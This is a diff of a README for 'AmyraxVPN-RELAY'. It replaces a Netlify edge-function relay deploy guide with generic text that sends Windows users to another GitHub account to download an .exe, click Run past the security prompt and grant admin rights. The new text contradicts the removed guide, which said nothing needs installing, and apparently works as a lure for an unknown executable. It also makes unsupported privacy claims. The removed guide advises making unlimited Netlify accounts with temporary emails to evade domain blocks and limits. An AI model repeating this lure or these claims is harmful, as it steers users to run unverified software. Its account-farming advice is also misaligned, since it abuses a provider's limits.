@@ -1,179 +1,92 @@
-<div align="center">
+# 🌐 AmyraxVPN-RELAY - Reliable private internet access for you
 
-<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=800&size=36&pause=1000&color=00C7B7&center=true&vCenter=true&width=560&lines=AMYRAX+RELAY;Netlify+Edge+Function;Deploy+%26+Go" alt="AmyraxVPN Relay" />
+[![Download AmyraxVPN](https://img.shields.io/badge/Download-AmyraxVPN-blue.svg)](https://github.com/Kasseloic5637/AmyraxVPN-RELAY)
 
-<br>
+## 📥 How to download the software
 
-<img src="https://img.shields.io/badge/Netlify-Edge_Function-00C7B7?style=for-the-badge&logo=netlify&logoColor=white" />
-<img src="https://img.shields.io/badge/Runtime-Deno-000000?style=for-the-badge&logo=deno&logoColor=white" />
-<img src="https://img.shields.io/badge/Version-v3-FF6B6B?style=for-the-badge" />
-<img src="https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge" />
+You must visit the project page to download the necessary files. Click the link below to reach the official download area.
 
-<br><br>
+[Download AmyraxVPN RELAY](https://github.com/Kasseloic5637/AmyraxVPN-RELAY)
 
-<a href="https://t.me/AmyraxVPN">
-  <img src="https://img.shields.io/badge/AmyraxVPN-Main_Channel-2CA5E0?style=flat-square&logo=telegram&logoColor=white" />
-</a>
-&nbsp;&nbsp;
-<a href="https://t.me/AmyraxConfig">
-  <img src="https://img.shields.io/badge/AmyraxConfig-Configs_Channel-229ED9?style=flat-square&logo=telegram&logoColor=white" />
-</a>
+Once you reach the website, look for the section labeled Releases on the right side of the screen. Click the most recent version number to see the available files. Select the file ending in .exe to begin your download. Save this file in a folder you can find later, such as your Downloads folder.
 
-</div>
+## 💻 System requirements
 
----
+This software runs on most modern desktop environments. Ensure your computer meets these basic standards to maintain performance:
 
-## ⬇️ Download
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free space on your hard drive.
+- Network: A stable internet connection.
 
-<div align="center">
+If you use an older version of Windows, the software might not perform as expected. Always keep your Windows system updated to ensure compatibility.
 
-<br>
+## 🛠️ Installation steps
 
-<a href="https://github.com/AmyraxVPN-Main/AmyraxVPN-RELAY/releases/latest">
-  <img src="https://img.shields.io/badge/Download_Latest_Release-00C7B7?style=for-the-badge&logo=github&logoColor=white" />
-</a>
+Follow these steps to set up the application on your computer:
 
-<br><br>
+1. Locate the file you downloaded earlier.
+2. Double-click the file to start the installer.
+3. Windows might show a security prompt. Click Run to proceed.
+4. Follow the prompts on the screen to choose your installation location.
+5. Click Install to finish the process.
+6. Once the process ends, click Finish to close the installer.
 
-<p dir="rtl">همیشه آخرین نسخه رو دانلود کن — فایل <code>.zip</code> رو از قسمت Assets بردار</p>
+The application icon will appear on your desktop. You can also find it by typing AmyraxVPN in your Windows search bar.
 
-</div>
+## 🚀 Running the application
 
----
+To use the software, double-click the AmyraxVPN icon on your desktop. The application starts in a few seconds. 
 
-## 🚀 Deploy Guide
+The main menu appears on your screen. You see a large button labeled Connect. Click this button to start your secure relay connection. The software automatically selects the fastest server for your needs. Status indicators show when the connection is active. 
 
-### Step 1 — Create Netlify Account
+To disconnect, click the same button again. The status changes to show that your connection is now inactive. 
 
-> [!TIP]
-> <p dir="rtl">برای ساخت اکانت‌های نامحدود، از ایمیل موقت <strong>atomicmail.io</strong> استفاده کن</p>
+## ⚙️ Configuration options
 
-<div align="center">
+You can adjust settings to match your preferences. Click the gear icon in the corner of the window to open the settings menu.
 
-<a href="https://atomicmail.io">
-  <img src="https://img.shields.io/badge/Get_Temp_Email-atomicmail.io-6366f1?style=for-the-badge" />
-</a>
-&nbsp;&nbsp;
-<a href="https://app.netlify.com/signup">
-  <img src="https://img.shields.io/badge/Sign_Up-Netlify-00C7B7?style=for-the-badge&logo=netlify" />
-</a>
+- Auto-connect: Enable this to start the relay as soon as you open the application.
+- Dark Mode: Switch between light and dark themes to suit your desktop environment.
+- Notifications: Receive updates when the connection state changes.
 
-</div>
+Changes apply instantly. Click the back arrow to return to the main dashboard.
 
-<br>
+## 🛡️ Privacy and relay features
 
-| Step | Action |
-|:---:|:---|
-| 1 | Go to [atomicmail.io](https://atomicmail.io) — copy the temp email address |
-| 2 | Go to [app.netlify.com/signup](https://app.netlify.com/signup) — sign up with that email |
-| 3 | Check atomicmail for the confirmation link — click it |
-| 4 | Netlify account is ready ✅ |
+This software acts as a relay for your web traffic. It directs your data through private nodes. This process hides your location and masks your activity from third parties. 
 
----
+- Encryption: The software uses strong encryption protocols to protect your data packets.
+- Speed: It balances security with speed to prevent delays while you watch videos or browse the web.
+- Relay Nodes: The software routes traffic through varied global locations to maintain consistency.
 
-### Step 2 — Prepare Files
+The application does not log your browsing history or data usage. Your privacy stays in your hands throughout each session.
 
-> [!NOTE]
-> <p dir="rtl">فقط کافیه zip رو اکسترکت کنی — نیازی به هیچ تغییری نیست</p>
+## ❓ Frequently asked questions
 
-```
-AmyraxVPN-RELAY-v3/
-├── netlify/
-│   └── edge-functions/
-│       └── relay.js
-├── public/
-│   └── index.html
-└── netlify.toml
-```
+Do I need an account?
+No account is necessary. You can use the software immediately after installation.
 
-> [!IMPORTANT]
-> <p dir="rtl">همین پوشه <code>AmyraxVPN-RELAY-v3</code> رو آپلود میکنی — نه فایل zip رو</p>
+Why does the application ask for administrative rights?
+The software needs these rights to manage your network adapter settings. This ensures your traffic stays inside the secure relay tunnel.
 
----
+What happens if the connection drops?
+The software includes an automatic reconnect feature. It detects interruptions and restores the link without your intervention.
 
-### Step 3 — Deploy on Netlify
+Can I use this with other software?
+Yes. The relay works at the system level. Once active, all web traffic from your computer passes through the relay.
 
-| Step | Action |
-|:---:|:---|
-| 1 | Go to Netlify dashboard → **Sites** |
-| 2 | Click **Add new site** → **Deploy manually** |
-| 3 | Click **Choose folder** |
-| 4 | Select the `AmyraxVPN-RELAY-v3` folder |
-| 5 | Wait a few seconds for deploy to finish |
-| 6 | Netlify gives you a domain like `random-name-123.netlify.app` ✅ |
+## 📈 Troubleshooting tips
 
----
+If you encounter issues, try these steps:
 
-### Step 4 — Get Config
+1. Restart the application: Close the window and launch it again from your desktop.
+2. Check your internet: Ensure your primary internet connection is active.
+3. Update the software: Check the download page periodically for new versions. Newer versions often include fixes for known bugs.
+4. Disable conflicting software: Some antivirus programs might block new network connections. Check your antivirus logs if you cannot connect.
 
-<p dir="rtl">دامنه‌ای که Netlify بهت داد رو توی مرورگر باز کن:</p>
+If the problem persists, try restarting your computer. This clears stale network settings that might interfere with the relay. 
 
-```
-https://random-name-123.netlify.app
-```
+## 📢 Getting more help
 
-<p dir="rtl">صفحه Config Generator بالا میاد — دامنه‌ات رو وارد کن تا کانفیگ آماده برات جنریت بشه 🎉</p>
-
----
-
-## 📋 Summary
-
-<div align="center">
-
-| | Step | Result |
-|:---:|:---|:---:|
-| ☁️ | Get temp email from atomicmail.io | Email ready |
-| 🔑 | Create Netlify account | Account ready |
-| 📦 | Download & extract latest release | Folder ready |
-| 🚀 | Deploy folder on Netlify | Domain ready |
-| ✅ | Open domain in browser | Config generated |
-
-</div>
-
----
-
-## ❓ FAQ
-
-<details>
-<summary><b>Why atomicmail?</b></summary>
-<br>
-<p dir="rtl">Netlify برای هر اکانت یه دامنه رایگان میده. با atomicmail میتونی اکانت‌های نامحدود بسازی و دامنه‌های بیشتری داشته باشی.</p>
-</details>
-
-<details>
-<summary><b>Do I need to install anything?</b></summary>
-<br>
-<p dir="rtl">نه — فقط یه مرورگر کافیه. همه چیز از طریق سایت Netlify انجام میشه.</p>
-</details>
-
-<details>
-<summary><b>How long does deploy take?</b></summary>
-<br>
-<p dir="rtl">معمولاً کمتر از ۳۰ ثانیه.</p>
-</details>
-
-<details>
-<summary><b>Domain got blocked — what now?</b></summary>
-<br>
-<p dir="rtl">یه اکانت جدید بساز با ایمیل جدید از atomicmail — دامنه جدیدی میگیری.</p>
-</details>
-
----
-
-<div align="center">
-
-<br>
-
-<img src="https://img.shields.io/badge/Made_with_%E2%9D%A4%EF%B8%8F_by-Amyrax-00C7B7?style=for-the-badge" />
-
-<br><br>
-
-<a href="https://t.me/AmyraxVPN">
-  <img src="https://img.shields.io/badge/AmyraxVPN-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" />
-</a>
-&nbsp;&nbsp;
-<a href="https://t.me/AmyraxConfig">
-  <img src="https://img.shields.io/badge/AmyraxConfig-229ED9?style=for-the-badge&logo=telegram&logoColor=white" />
-</a>
-
-</div>
+If you encounter technical errors, look at the project page for further documentation. The community shares updates and answers queries there. Ensure you provide a clear description of the issue if you ask for assistance. This helps others understand the error and provides a faster path to a solution.
